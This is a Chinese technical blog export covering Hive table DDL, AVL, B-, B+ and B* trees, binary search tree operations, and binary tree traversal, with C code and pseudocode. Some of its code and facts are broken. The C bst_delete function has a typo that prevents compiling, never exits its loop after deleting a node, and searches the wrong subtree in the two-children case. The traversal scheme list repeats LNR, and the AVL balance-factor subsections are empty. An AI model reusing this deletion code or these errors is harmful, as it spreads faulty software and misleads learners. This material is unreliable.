<h4 id="CREATE-TABLE语句"><a href="#CREATE-TABLE语句" class="headerlink" title="CREATE TABLE语句"></a>CREATE TABLE语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE [TEMPORARY] [EXTERNAL] TABLE [IF NOT EXISTS] [db_name.] table_name</span><br><span class="line"></span><br><span class="line">[(col_name data_type [COMMENT col_comment], ...)]</span><br><span class="line">[COMMENT table_comment]</span><br><span class="line">[ROW FORMAT row_format]</span><br><span class="line">[STORED AS file_format]</span><br></pre></td></tr></table></figure>

<p>下面的数据是一个注释，行格式字段，如字段终止符，行终止符，并保存的文件类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">COMMENT ‘Employee details’</span><br><span class="line">FIELDS TERMINATED BY ‘\t’</span><br><span class="line">LINES TERMINATED BY ‘\n’</span><br><span class="line">STORED IN TEXT FILE</span><br></pre></td></tr></table></figure>
<p>下面的查询创建使用上述数据的表名为 employee。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hive&gt; CREATE TABLE IF NOT EXISTS employee ( eid int, name String,</span><br><span class="line">&gt; salary String, destination String)</span><br><span class="line">&gt; COMMENT ‘Employee details’</span><br><span class="line">&gt; ROW FORMAT DELIMITED</span><br><span class="line">&gt; FIELDS TERMINATED BY ‘\t’</span><br><span class="line">&gt; LINES TERMINATED BY ‘\n’</span><br><span class="line">&gt; STORED AS TEXTFILE;</span><br></pre></td></tr></table></figure>
<h4 id="Drop-Table语句"><a href="#Drop-Table语句" class="headerlink" title="Drop Table语句"></a>Drop Table语句</h4><p><code>DROP TABLE [IF EXISTS] table_name;</code></p>
<h4 id="查询表的列表"><a href="#查询表的列表" class="headerlink" title="查询表的列表"></a>查询表的列表</h4><p><code>SHOW TABLES;</code></p>
<h4 id="Alter-Table-语句"><a href="#Alter-Table-语句" class="headerlink" title="Alter Table 语句"></a>Alter Table 语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE name RENAME TO new_name</span><br><span class="line">ALTER TABLE name ADD COLUMNS (col_spec[, col_spec ...])</span><br><span class="line">ALTER TABLE name DROP [COLUMN] column_name</span><br><span class="line">ALTER TABLE name CHANGE column_name new_name new_type</span><br><span class="line">ALTER TABLE name REPLACE COLUMNS (col_spec[, col_spec ...])</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title>AVLT自平衡二叉查找树</title>
    <url>/blog/algorithm/tree/avlt/</url>
    <content><![CDATA[<h2 id="AVL树定义"><a href="#AVL树定义" class="headerlink" title="AVL树定义"></a>AVL树定义</h2><p>在计算机科学中，AVL树是最先发明的自平衡二叉查找树（[Balanced Binary<br>Search<br>Tree,BBST]{style&#x3D;”color: rgb(51, 51, 51); font-family: arial, 宋体, sans-serif; line-height: 26px;”}）。在AVL树中任何节点的两个子树的高度最大差别为一，所以它也被称为高度平衡树。查找、插入和删除在平均和最坏情况下都是O（log<br>n）。增加和删除可能需要通过一次或多次树旋转来重新平衡这个树。AVL树得名于它的发明者G.M.<br>Adelson-Velsky和E.M. Landis，他们在1962年的论文《An algorithm for the<br>organization of information》中发表了它。</p>
<p>节点的平衡因子是它的右子树的高度减去它的左子树的高度。带有平衡因子1、0或<br>-1的节点被认为是平衡的。带有平衡因子<br>-2或2的节点被认为是不平衡的，并需要重新平衡这个树。平衡因子可以直接存储在每个节点中，或从可能存储在节点中的子树高度计算出来。</p>
<h2 id="关键问题"><a href="#关键问题" class="headerlink" title="关键问题"></a>关键问题</h2><p>AVL树的操作中异于普通二叉查找树的地方是插入和删除过程。</p>
<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p>插入过程可能会导致不平衡的情况出现，这样我们就需要对这些情况进行处理-----即旋转。先来个详细的图：（Root是失去平衡的树的根结点，pivot是旋转后重新平衡的树的根结点。</p>
<p><img src="/images/tree/bstrotate.gif"></p>
<p>总共有四种情况插入导致不平衡：（不平衡结点为上图中的root)</p>
<p>（1）不平衡结点的左子树的左子树高度增加，导致不平衡结点的左子树结点高度增加，如果不平衡结点的左子树结点高度原来就比不平衡结点的右子树结点高度大一，则现在变为大2.导致不平衡结点的平衡因子由-1变为-2。需要对不平衡结点进行右旋，即把不平衡结点移动到它的右孩子的位置，将左孩子移动到它的位置上，并将左孩子的右子树接到不平衡结点的左孩子上。</p>
<p>（2）不平衡结点的右子树的右子树高度增加，导致不平衡结点的右子树结点高度增加，如果不平衡结点的右子树结点高度原来就比不平衡结点的左子树结点高度大一，则现在变为大2.导致不平衡结点的平衡因子由1变为2。需要对不平衡结点进行左旋，即把不平衡结点移动到它的左孩子的位置，将右孩子移动到它的位置上，并将右孩子的左子树接到不平衡结点的右孩子上。</p>
<p>下面两种情况进行一次旋转并不能使树恢复平衡，需要进行两次旋转。</p>
<p>（3）不平衡结点的左子树的右子树高度增加，导致不平衡结点的左子树结点高度增加，如果不平衡结点的左子树结点高度原来就比不平衡结点的右子树结点高度大一，则现在变为大2.导致不平衡结点的平衡因子由-1变为-2。先进行左旋使树变为（1）的情况，再进行右旋。</p>
<p>（4）不平衡结点的右子树的左子树高度增加，导致不平衡结点的右子树结点高度增加，如果不平衡结点的右子树结点高度原来就比不平衡结点的左子树结点高度大一，则现在变为大2.导致不平衡结点的平衡因子由1变为2。先进行右旋使树变为（2）的情况，再进行左旋。</p>
<p>知道了四种需要进行旋转的情况，我们知道有不平衡结点后该如何进行位置调整。但是如何知道查找平衡结点呢？当我们进行插入时，需要将插入元素不断地与树中的结点进行比较，然后决定插入它的左子树还是它的右子树，这条路径记录了插入元素和哪些结点相关（即哪些结点的左子树或右子树插入了元素）。这条路径上的结点的平衡因子可能会发生变化，记住是可能。</p>
<h2 id="调整平衡因子"><a href="#调整平衡因子" class="headerlink" title="调整平衡因子"></a>调整平衡因子</h2><p>插入结点后，插入路径上的结点的平衡因子需要进行调整以表达现在的平衡情况。是不是在插入路径范围进行变化呢？不是。之后的回溯过程会从插入路径回溯，直到找到不平衡点，找到不平衡点后，不平衡点的祖先结点们的平衡因子是不用改变的。从插入结点到不平衡结点中的每个结点之间的平衡因子需要怎么变化呢？因为它们的平衡因子之前都是0.现在插入了新结点，这些结点的高度都会加1.如果插入元素小于结点值，则结点平衡因子-1，大于则结点平衡因子+1（分别对应插入了结点的哪个子树中）。至于为什么么这些结点的平衡因子都是之前都是零0，看获得不平衡点。</p>
<h2 id="获得不平衡点"><a href="#获得不平衡点" class="headerlink" title="获得不平衡点"></a>获得不平衡点</h2><p>分析旋转的四种情况，不然发现，旋转前和旋转后，子树t的高度是没有变化的。也就是说只需要找到路径中和插入结点最近的不平衡点，然后以该不平衡结点进行旋转处理，则路径中该不平衡结点的祖先结点们的平衡因子是不变的。该结点即为不平衡点，即旋转中的root结点。由此可见插入新元素后不平衡点可能大于一个，但是经过对离插入结点最近的不平衡点进行旋转调整后，不平衡点全部消失。如何判断谁是可能是最近的不平衡点呢？插入路径中离插入结点最近的插入时平衡因子不等于0的结点即为可能的不平衡点。为什么呢?因为如果结点平衡因子是0，插入一个结点不会导致该结点的平衡因子变为+2，或者-2。但是会改变它的父结点的平衡因子，会使父结点的平衡因子变化1。如果父结点的平衡因子之前是0.则继续向上回溯。</p>
<p>（1）如果父结点的平衡因子因为变化1而变为0，则是在父结点的较短的子树中插入了新结点导致子树高度加1，使父结点平衡因子变为了0。父结点为根的子树高度没有变化，则祖先们的平衡因子不需要变化，所以得到没有平衡因子的结论。</p>
<p>2)如果父结点的平衡因子因为变化1而变为-2或者+2,那么父结点成为了不平衡结点，需要以父结点为根进行旋转变化。至于使用哪种变化，首先根据父结点与插入值的大小关系，插入值小于该结点，则为L，大于则为R。再根据插入值与该结点的左孩子（L）或者右孩子（R）进行大小比较得出。LL、LR、RR、RL四种情况之一进行位置调整。</p>
<h2 id="旋转后平衡因子调整"><a href="#旋转后平衡因子调整" class="headerlink" title="旋转后平衡因子调整"></a>旋转后平衡因子调整</h2><p>上面获取不平衡结点后，进行了位置调整，但是位置调整后平衡因子也需要再次调整。</p>
<p>一、LL型平衡因子调整</p>
<p>二、LR型平衡因子调整</p>
<p>三、RR型平衡因子调整</p>
<p>四、RL型平衡因子调整</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>B+树</title>
    <url>/blog/algorithm/tree/b+tree/</url>
    <content><![CDATA[<p><strong>B+树</strong></p>
<p>B+树是B-树的变体，也是一种多路搜索树：</p>
<p>1.其定义基本与B-树同，除了：</p>
<p>2.非叶子结点的子树指针与关键字个数相同；</p>
<p>3.非叶子结点的子树指针P[i]，指向关键字值属于[K[i],<br>K[i+1])的子树（B-树是开区间）；</p>
<p>5.为所有叶子结点增加一个链指针；</p>
<p>6.所有关键字都在叶子结点出现；</p>
<p>如：（M&#x3D;3）</p>
<p><img src="/images/tree/b+tree.gif"></p>
<p>B+的搜索与B-树也基本相同，区别是B+树只有达到叶子结点才命中（B-树可以在非叶子结点命中），其性能也等价于在关键字全集做一次二分查找；</p>
<p>B+的特性：</p>
<p>1.所有关键字都出现在叶子结点的链表中（稠密索引），且链表中的关键字恰好是有序的；</p>
<p>2.不可能在非叶子结点命中；</p>
<p>3.非叶子结点相当于是叶子结点的索引（稀疏索引），叶子结点相当于是存储（关键字）数据的数据层；</p>
<p>4.更适合文件索引系统；比如对已经建立索引的数据库记录，查找10&lt;&#x3D;id&lt;&#x3D;20，那么只要通过根节点搜索到id&#x3D;10的叶节点，之后只要根据叶节点的链表找到第一个大于20的就行了，比B-树在查找10到20内的每一个时每次都从根节点出发查找提高了不少效率。</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>B-树</title>
    <url>/blog/algorithm/tree/b-tree/</url>
    <content><![CDATA[<p><strong>B-树</strong></p>
<p>B-树是一种平衡多路搜索树（并不是二叉的）：</p>
<p>1.定义任意非叶子结点最多只有M个儿子；且M&gt;2；</p>
<p>2.根结点的儿子数为[2, M]；</p>
<p>3.除根结点以外的非叶子结点的儿子数为[M&#x2F;2, M]；</p>
<p>4.每个结点存放至少M&#x2F;2-1（取上整）和至多M-1个关键字；（至少2个关键字）</p>
<p>5.非叶子结点的关键字个数&#x3D;指向儿子的指针个数-1；</p>
<p>6.非叶子结点的关键字：K[1], K[2], …, K[M-1]；且K[i] &lt;<br>K[i+1]；</p>
<p>7.非叶子结点的指针：P[1], P[2], …,<br>P[M]；其中P[1]指向关键字小于K[1]的子树，P[M]指向关键字大于K[M-1]的子树，其它P[i]指向关键字属于(K[i-1],<br>K[i])的子树；</p>
<p>8.所有叶子结点位于同一层；</p>
<p>如：（<strong>M&#x3D;3</strong>）</p>
<p><img src="/images/tree/b-tree.gif"></p>
<p>B-树的搜索，从根结点开始，对结点内的关键字（有序）序列进行二分查找，如果命中则结束，否则进入查询关键字所属范围的儿子结点；重复，直到所对应的儿子指针为空，或已经是叶子结点；</p>
<p>B-树的特性：</p>
<p>1.关键字集合分布在整颗树中；</p>
<p>2.任何一个关键字出现且只出现在一个结点中；</p>
<p>3.搜索有可能在非叶子结点结束；</p>
<p>4.其搜索性能等价于在关键字全集内做一次二分查找；</p>
<p>5.自动层次控制；</p>
<p>由于限制了除根结点以外的非叶子结点，至少含有M&#x2F;2个儿子，确保了结点的至少利用率，其最底搜索性能为：</p>
<p><img src="/images/tree/b-treexn.gif"></p>
<p>其中，M为设定的非叶子结点最多子树个数，N为关键字总数；</p>
<p>所以B-树的性能总是等价于二分查找（与M值无关），也就没有B树平衡的问题；</p>
<p>由于M&#x2F;2的限制，在插入结点时，如果结点已满，需要将结点分裂为两个各占M&#x2F;2的结点；删除结点时，需将两个不足M&#x2F;2的兄弟结点合并；</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>BST二叉搜索树</title>
    <url>/blog/algorithm/tree/bst/</url>
    <content><![CDATA[<h2 id="二叉搜索树-Binary-Search-Tree-BST"><a href="#二叉搜索树-Binary-Search-Tree-BST" class="headerlink" title="二叉搜索树(Binary Search Tree,BST)"></a>二叉搜索树(Binary Search Tree,BST)</h2><p>1.所有非叶子结点至多拥有两个儿子（Left和Right）；</p>
<p>2.所有结点存储一个关键字；</p>
<p>3.非叶子结点的左指针指向小于其关键字的子树，右指针指向大于其关键字的子树；</p>
<p>如：</p>
<p><img src="/images/tree/bst1.jpg"></p>
<p>BST树的搜索，从根结点开始，如果查询的关键字与结点的关键字相等，那么就命中；</p>
<p>否则，如果查询关键字比结点关键字小，就进入左儿子；如果比结点关键字大，就进入右儿子；如果左儿子或右儿子的指针为空，则报告找不到相应的关键字；</p>
<p>如果BST树的所有非叶子结点的左右子树的结点数目均保持差不多（平衡），那么B树的搜索性能逼近二分查找；但它比连续内存空间的二分查找的优点是，改变BST树结构（插入与删除结点）不需要移动大段的内存数据，甚至通常是常数开销；</p>
<p>如：</p>
<p><img src="/images/tree/bst2.jpg"></p>
<p>但BST树在经过多次插入与删除后，有可能导致不同的结构：</p>
<p><img src="/images/tree/bst3.jpg"></p>
<p>右边也是一个BST树，但它的搜索性能已经是线性的了；同样的关键字集合有可能导致不同的树结构索引；所以，使用BST树还要考虑尽可能让BST树保持左图的结构，和避免右图的结构，也就是所谓的”平衡”问题；</p>
<h2 id="BST查找操作"><a href="#BST查找操作" class="headerlink" title="BST查找操作"></a>BST查找操作</h2><pre><code>BSTNode* bst_search(BSTNode* node, int value) &#123;
  while(node != NULL) &#123;
    if(value &lt; node-&gt;value) // 向左 
      node = node-&gt;left;
    else if(value &gt; node-&gt;value) // 向右 
      node = node-&gt;right;
    else // 找到 
      return node;
  &#125;
  return NULL; // 失败 
&#125;
</code></pre>
<h2 id="BST树的插入操作"><a href="#BST树的插入操作" class="headerlink" title="BST树的插入操作"></a>BST树的插入操作</h2><p>首先找到插入的位置，要么向左，要么向右，直到找到空结点，即为插入位置，如果找到了相同值的结点，插入失败。</p>
<p>伪代码：</p>
<pre><code>TREE-INSERT(T, z)
 1  y ← nil[T]                 // y 始终指向 x 的父结点。
 2  x ← root[T]              // x 指向当前树的根结点，
 3  while x ≠ nil[T]
 4      do y ← x
 5         if key[z] &lt; key[x]   //向左，向右..
 6            then x ← left[x]
 7            else x ← right[x] // 为了找到合适的插入点，x 探路跟踪路径，直到x成为NIL 为止。
 8  p[z] ← y         // y置为 插入结点z 的父结点。
 9  if y = nil[T]
10     then root[T] ← z
11     else if key[z] &lt; key[y]
12             then left[y] ← z
13             else right[y] ← z //此 8-13行，置z 相关的指针。
</code></pre>
<p>C代码：</p>
<pre><code>bool bst_insert(BSTNode*&amp; root, int value) &#123;
  BSTNode* pre = NULL;
  BSTNode* curr = root;
  while(curr != NULL) &#123;
    if(value &lt; curr-&gt;value) &#123; // 向左 
      pre = curr;
      curr = curr-&gt;left;
    &#125;
    else if(value &gt; curr-&gt;value) &#123; // 向右 
      pre = curr;
      curr = curr-&gt;right; 
    &#125;
    else // 失败 
      return false;
  &#125;
  curr = new BSTNode; // 插入 
  curr-&gt;value = value;
  curr-&gt;left = curr-&gt;right = NULL;
  if(pre == NULL)
    root = curr;
  else

    curr-&gt;value &lt; pre-&gt;value ? pre-&gt;left=curr : pre-&gt;right=curr;
  return true;
&#125;
</code></pre>
<h2 id="BST删除操作"><a href="#BST删除操作" class="headerlink" title="BST删除操作"></a>BST删除操作</h2><p>相对查找和插入复杂一点，根据待删除结点的孩子情况，分三种情况：没有孩子，只有一个孩子，有两个孩子。</p>
<p>1.没有孩子的情况，其父结点指向空，删除该结点。</p>
<p>2.有一个孩子的情况，其父结点指向其孩子，删除该结点。</p>
<p>3.有两个孩子的情况，当前结点要用其它结点替换，然后释放当前结点。</p>
<p>用左子树中的最大元素替换当前结点。左子树一直right到nil，可能有左节点。</p>
<p>用右子树中的最小结点替换当前结点。右子树一直left到nil，可能有右节点。</p>
<p>伪代码：</p>
<p>TREE-SUCCESSOR(z)为中序遍历z的后继节点，为z右子树中的最小结点</p>
<pre><code>TREE-DELETE(T, z)
 1 if left[z] = NIL or right[z] = NIL
 2    then y ← z
 3    else y ← TREE-SUCCESSOR(z)
 4 if left[y] ≠ NIL
 5    then x ← left[y]
 6    else x ← right[y]
 7 if x≠NIL
 8    then p[x] ← p[y]
 9 if p[y] = NIL
10    then root[T] ← x
11    else if y = left[p[y]]
12            then left[p[y]] ← x
13            else right[p[y]] ← x
14 if y ≠ z
15    then key[z] ← key[y]
16         copy y&#39;s satellite data into z 
17 return y  
</code></pre>
<p>C代码：</p>
<pre><code>bool bst_delete(BSTNode*&amp; node, int value) &#123;
  BSTNode*　parent = NULL;
  BSTNode* tmp;
  while(node != NULL) &#123;
    if(value &lt; node-&gt;value) &#123; // 向左 
      parent = node;
      node = node-&gt;left;
    &#125;
    else if(value &gt; node-&gt;value) &#123; // 向右 
      parent = node;
      node = node-&gt;right;
    &#125;
    else &#123; // 找到了 
      if(NULL==node-&gt;left &amp;&amp; NULL==node-right) &#123; // 叶子结点         
        if(parent == NULL) &#123; // 根结点 
          delete node;
          node = NULL;
        &#125;
        else &#123; // 非根结点 
          (parent-&gt;left==node)?(parent-&gt;left=NULL):(parent-&gt;right=NULL);
          delete node;
          node = NULL;
        &#125;        
      &#125;
      else if(NULL!=node-&gt;left &amp;&amp; NULL==node-&gt;right) &#123; // 只有左孩子
        if(parent == NULL) &#123; // 根结点 
          tmp = node;
          node = node-&gt;left;
          delete tmp;          
        &#125;
        else &#123; // 非根结点 
          (parent-&gt;left==node)?(parent-&gt;left=node-&gt;left):(parent-&gt;right=node-&gt;left);
          delete node;
        &#125;
      &#125;
      else if(NULL!=node-&gt;right &amp;&amp; NULL==node-&gt;left) &#123; // 只有右孩子 
        if(parent == NULL) &#123; // 根结点 
          tmp = node;
          node = node-&gt;right;
          delete tmp;          
        &#125;
        else &#123; // 非根结点 
          (parent-&gt;left==node)?(parent-&gt;left=node-&gt;right):(parent-&gt;right=node-&gt;right);
          delete node;
        &#125;
      &#125;
      else &#123; // 既有左孩子也有右孩子 
        BSTNode* leftNode = node;
        while(leftNode-&gt;right != NULL) &#123;
          parent = leftNode;
          leftNode = leftNode-&gt;right;
        &#125;
        // 交换leftNode与node
        int swapValue = leftNode-&gt;value;
        leftNode-&gt;value = node-&gt;value;
        node-&gt;value = swapValue;
        // 删除leftNode，parent肯定不为空 
        (parent-&gt;left==node)?(parent-&gt;left=NULL):(parent-&gt;right=NULL);
        delete node;
      &#125;
    &#125;
  &#125;
  return false; // 失败
&#125;
</code></pre>
]]></content>
      <categories>
        <category>算法</category>
        <category>树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树递归和非递归遍历</title>
    <url>/blog/algorithm/tree/bitreetraversal/</url>
    <content><![CDATA[<h2 id="二叉树基础"><a href="#二叉树基础" class="headerlink" title="二叉树基础"></a>二叉树基础</h2><p>1）定义：有且仅有一个根结点，除根节点外，每个结点只有一个父结点，最多含有两个子节点，子节点有左右之分。</p>
<p>2）存储结构</p>
<p>二叉树的存储结构可以采用顺序存储，也可以采用链式存储，其中链式存储更加灵活。</p>
<p>在链式存储结构中，与线性链表类似，二叉树的每个结点采用结构体表示，结构体包含三个域：数据域、左指针、右指针。</p>
<p>二叉树在C语言中的定义如下：</p>
<p>struct BiTreeNode{ int c; struct BiTreeNode *left; struct BiTreeNode<br>*right;};</p>
<h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><p>“遍历”是二叉树各种操作的基础。二叉树是一种非线性结构，其遍历不像线性链表那样容易，无法通过简单的循环实现。</p>
<p>二叉树是一种树形结构，遍历就是要让树中的所有节点被且仅被访问一次，即按一定规律排列成一个线性队列。二叉（子）树是一种递归定义的结构，包含三个部分：根结点（N）、左子树（L）、右子树（R）。根据这三个部分的访问次序对二叉树的遍历进行分类，总共有6种遍历方案：NLR、LNR、LRN、NRL、RNL和LNR。研究二叉树的遍历就是研究这6种具体的遍历方案，显然根据简单的对称性，左子树和右子树的遍历可互换，即NLR与NRL、LNR与RNL、LRN与RLN，分别相类似，因而只需研究NLR、LNR和LRN三种即可，分别称为”先序遍历”、”中序遍历”和”后序遍历”。</p>
<p>二叉树遍历通常借用”栈”这种数据结构实现，有两种方式：递归方式及非递归方式。</p>
<p>在递归方式中，栈是由操作系统维护的，用户不必关心栈的细节操作，用户只需关心”访问顺序”即可。因而，采用递归方式实现二叉树的遍历比较容易理解，算法简单，容易实现。</p>
<p>递归方式实现二叉树遍历的C语言代码如下：</p>
<pre><code>//先序遍历--递归
int traverseBiTreePreOrder(BiTreeNode *ptree,int (*visit)(int))
&#123;
    if(ptree)
    &#123;
        if(visit(ptree-&gt;c))
            if(traverseBiTreePreOrder(ptree-&gt;left,visit))
                if(traverseBiTreePreOrder(ptree-&gt;right,visit))
                    return 1;  //正常返回
        return 0;   //错误返回
    &#125;else return 1;   //正常返回
&#125;
//中序遍历--递归
int traverseBiTreeInOrder(BiTreeNode *ptree,int (*visit)(int))
&#123;
    if(ptree)
    &#123;
        if(traverseBiTreeInOrder(ptree-&gt;left,visit))
            if(visit(ptree-&gt;c))
                if(traverseBiTreeInOrder(ptree-&gt;right,visit))
                    return 1;
        return 0;
    &#125;else return 1;
&#125;
//后序遍历--递归
int traverseBiTreePostOrder(BiTreeNode *ptree,int (*visit)(int))
&#123;
    if(ptree)
    &#123;
        if(traverseBiTreePostOrder(ptree-&gt;left,visit))
            if(traverseBiTreePostOrder(ptree-&gt;right,visit))
                if(visit(ptree-&gt;c))
                    return 1;
        return 0;
    &#125;else return 1;
&#125;
</code></pre>
<p>以上代码中，visit为一函数指针，用于传递二叉树中对结点的操作方式，其原型为：int<br>(*visit)(char)。</p>
<p>大家知道，函数在调用时，会自动进行栈的push，调用返回时，则会自动进行栈的pop。函数递归调用无非是对一个栈进行返回的push与pop，既然递归方式可以实现二叉树的遍历，那么借用”栈”采用非递归方式，也能实现遍历。但是，这时的栈操作（push、pop等）是由用户进行的，因而实现起来会复杂一些，而且也不容易理解，但有助于我们对树结构的遍历有一个深刻、清晰的理解。</p>
<p>在讨论非递归遍历之前，我们先定义栈及各种需要用到的栈操作：</p>
<pre><code>//栈的定义，栈的数据是“树结点的指针”
struct Stack&#123;
    BiTreeNode **top;
    BiTreeNode **base;
    int size;
&#125;;
#define STACK_INIT_SIZE 100
#define STACK_INC_SIZE 10
//初始化空栈，预分配存储空间
Stack* initStack()
&#123;
    Stack *qs=NULL;
    qs=(Stack *)malloc(sizeof(Stack));
    qs-&gt;base=(BiTreeNode **)calloc(STACK_INIT_SIZE,sizeof(BiTreeNode *));
    qs-&gt;top=qs-&gt;base;
    qs-&gt;size=STACK_INIT_SIZE;
    return qs;
&#125;
//取栈顶数据
BiTreeNode* getTop(Stack *qs)
&#123;
    BiTreeNode *ptree=NULL;
    if(qs-&gt;top==qs-&gt;base)
        return NULL;
    ptree=*(qs-&gt;top-1);
    return ptree;
&#125;
//入栈操作
int push(Stack *qs,BiTreeNode *ptree)
&#123;
    if(qs-&gt;top-qs-&gt;base&gt;=qs-&gt;size)
    &#123;
        qs-&gt;base=(BiTreeNode **)realloc(qs-&gt;base,(qs-&gt;size+STACK_INC_SIZE)*sizeof(BiTreeNode *));
        qs-&gt;top=qs-&gt;base+qs-&gt;size;
        qs-&gt;size+=STACK_INC_SIZE;
    &#125;
    *qs-&gt;top++=ptree;
    return 1;
&#125;
//出栈操作
BiTreeNode* pop(Stack *qs)
&#123;
    if(qs-&gt;top==qs-&gt;base)
        return NULL;
    return *--qs-&gt;top;
&#125;
//判断栈是否为空
int isEmpty(Stack *qs)
&#123;
    return qs-&gt;top==qs-&gt;base;
&#125;
</code></pre>
<p>首先考虑非递归先序遍历（NLR）。在遍历某一个二叉（子）树时，以一当前指针记录当前要处理的二叉（左子）树，以一个栈保存当前树之后处理的右子树。首先访问当前树的根结点数据，接下来应该依次遍历其左子树和右子树，然而程序的控制流只能处理其一，所以考虑将右子树的根保存在栈里面，当前指针则指向需先处理的左子树，为下次循环做准备；若当前指针指向的树为空，说明当前树为空树，不需要做任何处理，直接弹出栈顶的子树，为下次循环做准备。相应的C语言代码如下：</p>
<pre><code>//先序遍历--非递归
int traverseBiTreePreOrder2(BiTreeNode *ptree,int (*visit)(int))
&#123;
    Stack *qs=NULL;
    BiTreeNode *pt=NULL;
    qs=initStack();
    pt=ptree;
    while(pt || !isEmpty(qs))
    &#123;
        if(pt)
        &#123;
            if(!visit(pt-&gt;c)) return 0;  //错误返回
            push(qs,pt-&gt;right);
            pt=pt-&gt;left;
        &#125;
        else pt=pop(qs);
    &#125;
    return 1;   //正常返回
&#125;
</code></pre>
<p>相对于非递归先序遍历，非递归的中序&#x2F;后序遍历稍复杂一点。</p>
<p>对于非递归中序遍历，若当前树不为空树，则访问其根结点之前应先访问其左子树，因而先将当前根节点入栈，然后考虑其左子树，不断将非空的根节点入栈，直到左子树为一空树；当左子树为空时，不需要做任何处理，弹出并访问栈顶结点，然后指向其右子树，为下次循环做准备。</p>
<pre><code>//中序遍历--非递归
int traverseBiTreeInOrder2(BiTreeNode *ptree,int (*visit)(int))
&#123;
    Stack *qs=NULL;
    BiTreeNode *pt=NULL;
    qs=initStack();
    pt=ptree;
    while(pt || !isEmpty(qs))
    &#123;
        if(pt)
        &#123;
            push(qs,pt);
            pt=pt-&gt;left;
        &#125;
        else
        &#123;
            pt=pop(qs);
            if(!visit(pt-&gt;c)) return 0;
            pt=pt-&gt;right;
        &#125;
    &#125;
    return 1;
&#125;
//中序遍历--非递归--另一种实现方式
int traverseBiTreeInOrder3(BiTreeNode *ptree,int (*visit)(int))
&#123;
    Stack *qs=NULL;
    BiTreeNode *pt=NULL;
    qs=initStack();
    push(qs,ptree);
    while(!isEmpty(qs))
    &#123;
        while(pt=getTop(qs)) push(qs,pt-&gt;left);
        pt=pop(qs);
        if(!isEmpty(qs))
        &#123;
            pt=pop(qs);
            if(!visit(pt-&gt;c)) return 0;
            push(qs,pt-&gt;right);
        &#125;
    &#125;
    return 1;
&#125;
</code></pre>
<p>最后谈谈非递归后序遍历。由于在访问当前树的根结点时，应先访问其左、右子树，因而先将根结点入栈，接着将右子树也入栈，然后考虑左子树，重复这一过程直到某一左子树为空；如果当前考虑的子树为空，若栈顶不为空，说明第二栈顶对应的树的右子树未处理，则弹出栈顶，下次循环处理，并将一空指针入栈以表示其另一子树已做处理；若栈顶也为空树，说明第二栈顶对应的树的左右子树或者为空，或者均已做处理，直接访问第二栈顶的结点，访问完结点后，若栈仍为非空，说明整棵树尚未遍历完，则弹出栈顶，并入栈一空指针表示第二栈顶的子树之一已被处理。</p>
<pre><code>//后序遍历--非递归
int traverseBiTreePostOrder2(BiTreeNode *ptree,int (*visit)(int))
&#123;
    Stack *qs=NULL;
    BiTreeNode *pt=NULL;
    qs=initStack();
    pt=ptree;
    while(1)  //循环条件恒“真”
    &#123;
        if(pt)
        &#123;
            push(qs,pt);
            push(qs,pt-&gt;right);
            pt=pt-&gt;left;
        &#125;
        else if(!pt)
        &#123;
            pt=pop(qs);
            if(!pt)
            &#123;
                pt=pop(qs);
                if(!visit(pt-&gt;c)) return 0;
                if(isEmpty(qs)) return 1;
                pt=pop(qs);
            &#125;
            push(qs,NULL);
        &#125;
    &#125;
    return 1;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>算法</category>
        <category>树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>B*树</title>
    <url>/blog/algorithm/tree/bxtree/</url>
    <content><![CDATA[<p><strong>B*树</strong></p>
<p>是B+树的变体，在B+树的非根和非叶子结点再增加指向兄弟的指针；</p>
<p><img src="/images/tree/bxtree.gif"></p>
<p>B*树定义了非叶子结点关键字个数至少为(2&#x2F;3)*M，即块的最低使用率为2&#x2F;3（代替B+树的1&#x2F;2）；</p>
<p>B+树的分裂：当一个结点满时，分配一个新的结点，并将原结点中1&#x2F;2的数据复制到新结点，最后在父结点中增加新结点的指针；B+树的分裂只影响原结点和父结点，而不会影响兄弟结点，所以它不需要指向兄弟的指针；</p>
<p>B*树的分裂：当一个结点满时，如果它的下一个兄弟结点未满，那么将一部分数据移到兄弟结点中，再在原结点插入关键字，最后修改父结点中兄弟结点的关键字（因为兄弟结点的关键字范围改变了）；如果兄弟也满了，则在原结点与兄弟结点之间增加新结点，并各复制1&#x2F;3的数据到新结点，最后在父结点增加新结点的指针；</p>
<p>所以，B*树分配新结点的概率比B+树要低，空间使用率更高；</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>树算法</tag>
      </tags>
  </entry>
  <entry>
    <title>常用树结构和其算法</title>
    <url>/blog/algorithm/tree/index/</url>
    <content><![CDATA[<p>B树：二叉树，每个结点只存储一个关键字，等于则命中，小于走左结点，大于走右结点；</p>
<p>B-树：多路搜索树，每个结点存储M&#x2F;2到M个关键字，非叶子结点存储指向关键字范围的子结点；</p>
<p>所有关键字在整颗树中出现，且只出现一次，非叶子结点可以命中；</p>
<p>B+树：在B-树基础上，为叶子结点增加链表指针，所有关键字都在叶子结点中出现，非叶子结点作为叶子结点的索引；B+树总是到叶子结点才命中；</p>
